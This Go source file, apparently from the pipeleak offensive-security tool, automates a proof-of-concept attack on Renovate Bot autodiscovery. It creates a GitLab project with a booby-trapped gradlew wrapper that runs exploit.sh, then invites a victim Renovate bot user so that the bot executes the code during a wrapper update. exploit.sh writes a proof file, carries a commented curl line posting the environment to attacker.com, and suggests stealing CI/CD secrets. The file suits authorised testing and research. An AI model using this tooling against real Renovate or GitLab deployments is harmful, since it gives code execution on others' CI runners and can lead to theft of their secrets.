package renovate

import (
	"github.com/CompassSecurity/pipeleak/pkg/format"
	"github.com/CompassSecurity/pipeleak/pkg/gitlab/util"
	"github.com/rs/zerolog/log"
	gogitlab "gitlab.com/gitlab-org/api/client-go"
)

var renovateJson = `
{
    "$schema": "https://docs.renovatebot.com/renovate-schema.json",
    "extends": [
       "config:recommended"
    ]
}
`

var buildGradle = `
plugins {
    id 'java'
}

repositories {
    mavenCentral()
}

dependencies {
    implementation 'com.google.guava:guava:31.0-jre'
}
`

var gradlewScript = `#!/bin/sh
# Malicious Gradle wrapper script that executes during Renovate's artifact update phase
# This runs when Renovate detects a Gradle wrapper update

# Execute exploit
sh exploit.sh

# Continue with a fake gradle command to avoid errors
echo "Gradle wrapper executed"
exit 0
`

var gradleWrapperProperties = `distributionBase=GRADLE_USER_HOME
distributionPath=wrapper/dists
distributionUrl=https\://services.gradle.org/distributions/gradle-7.0-bin.zip
zipStoreBase=GRADLE_USER_HOME
zipStorePath=wrapper/dists
`

var exploitScript = `#!/bin/sh
# Create a proof file to verify execution
echo "Exploit executed at $(date)" > /tmp/pipeleak-exploit-executed.txt
echo "Working directory: $(pwd)" >> /tmp/pipeleak-exploit-executed.txt
echo "User: $(whoami)" >> /tmp/pipeleak-exploit-executed.txt

echo "Exploit executed during Renovate autodiscovery"
echo "Replace this with your actual exploit code"
echo "Examples:"
echo "  - Exfiltrate environment variables"
echo "  - Read GitLab CI/CD variables"
echo "  - Access secrets from the runner"

# Example: Exfiltrate environment to attacker server
# curl -X POST https://attacker.com/collect -d "$(env)"
`

var gitlabCiYml = `
# GitLab CI/CD pipeline that runs Renovate Bot for debugging
# This verifies the exploit actually executes during Gradle wrapper update
#
# Setup instructions:
# 1. Go to Project Settings > Access Tokens
# 2. Create a new project access token with 'api' scope and 'Maintainer' role (required for autodiscover)
# 3. Go to Project Settings > CI/CD > Variables
# 4. Add a new variable: Key = RENOVATE_TOKEN, Value = <your-token>
# 5. Run the pipeline and check the job output for exploit execution proof

renovate-debugging:
  image: renovate/renovate:latest
  script:
    - renovate --platform gitlab --autodiscover=true --token=$RENOVATE_TOKEN
    - echo "=== Checking if exploit executed ==="
    - |
      if [ -f /tmp/pipeleak-exploit-executed.txt ]; then
        echo "SUCCESS: Exploit was executed!"
        echo "=== Exploit proof file contents ==="
        cat /tmp/pipeleak-exploit-executed.txt
        echo ""
        echo "=== Copying to workspace for artifact collection ==="
        cp /tmp/pipeleak-exploit-executed.txt exploit-proof.txt
      else
        echo "FAILED: /tmp/pipeleak-exploit-executed.txt not found"
        echo "Checking /tmp for any proof files..."
        ls -la /tmp/pipeleak-* 2>/dev/null || echo "No proof files found in /tmp"
      fi
  only:
    - main
  variables:
    LOG_LEVEL: debug
  artifacts:
    paths:
      - /tmp/pipeleak-exploit-executed.txt
    when: always
    expire_in: 1 day
`

func RunGenerate(gitlabUrl, gitlabApiToken, repoName, username string, addRenovateCICD bool) {
	git, err := util.GetGitlabClient(gitlabApiToken, gitlabUrl)
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed creating gitlab client")
	}

	if repoName == "" {
		repoName = format.RandomStringN(5) + "-pipeleak-renovate-autodiscovery-poc"
	}

	opts := &gogitlab.CreateProjectOptions{
		Name:        gogitlab.Ptr(repoName),
		JobsEnabled: gogitlab.Ptr(true),
	}

	project, _, err := git.Projects.CreateProject(opts)
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed creating project")
	}
	log.Info().Str("name", project.Name).Str("url", project.WebURL).Msg("Created project")

	createFile("renovate.json", renovateJson, git, int(project.ID), false)
	createFile("build.gradle", buildGradle, git, int(project.ID), false)
	createFile("gradlew", gradlewScript, git, int(project.ID), true)
	createFile("gradle/wrapper/gradle-wrapper.properties", gradleWrapperProperties, git, int(project.ID), false)
	createFile("exploit.sh", exploitScript, git, int(project.ID), true)

	if addRenovateCICD {
		createFile(".gitlab-ci.yml", gitlabCiYml, git, int(project.ID), false)
		log.Info().Msg("Created .gitlab-ci.yml for local Renovate testing")
		log.Warn().Msg("IMPORTANT: Add a CI/CD variable named RENOVATE_TOKEN with a project access token that has 'api' scope and at least maintainer permissions")
		log.Info().Msg("Then run the pipeline again, check the job output for 'SUCCESS: Exploit was executed!'")
		log.Info().Msg("If you want to retest, you need to DELETE the merge request and remove the branch that was created. Do not merge the update!")
	}

	if username == "" {
		log.Warn().Msg("No username provided, you must invite the victim Renovate Bot user manually to the created project")
	} else {
		invite(git, project, username)
	}

	log.Info().Msg("This exploit works by using an outdated Gradle wrapper version (7.0) that triggers Renovate to run './gradlew wrapper'")
	log.Info().Msg("When Renovate updates the wrapper, it executes our malicious gradlew script which runs exploit.sh")
	log.Info().Msg("Make sure to update the exploit.sh script with the actual exploit code")
	log.Info().Msg("Then wait until the created project is renovated by the invited Renovate Bot user")
}

func invite(git *gogitlab.Client, project *gogitlab.Project, username string) {
	log.Info().Str("user", username).Msg("Inviting user to project")

	_, _, err := git.ProjectMembers.AddProjectMember(project.ID, &gogitlab.AddProjectMemberOptions{
		Username:    gogitlab.Ptr(username),
		AccessLevel: gogitlab.Ptr(gogitlab.DeveloperPermissions),
	})

	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed inviting user to project, do it manually")
	}
}

func createFile(fileName string, content string, git *gogitlab.Client, projectId int, executable bool) {
	fileOpts := &gogitlab.CreateFileOptions{
		Branch:          gogitlab.Ptr("main"),
		Content:         gogitlab.Ptr(content),
		CommitMessage:   gogitlab.Ptr("Pipeleak create " + fileName),
		ExecuteFilemode: gogitlab.Ptr(executable),
	}
	fileInfo, _, err := git.RepositoryFiles.CreateFile(projectId, fileName, fileOpts)

	if err != nil {
		log.Fatal().Stack().Err(err).Str("fileName", fileName).Msg("Creating file failed")
	}

	log.Debug().Str("file", fileInfo.FilePath).Msg("Created file")
}
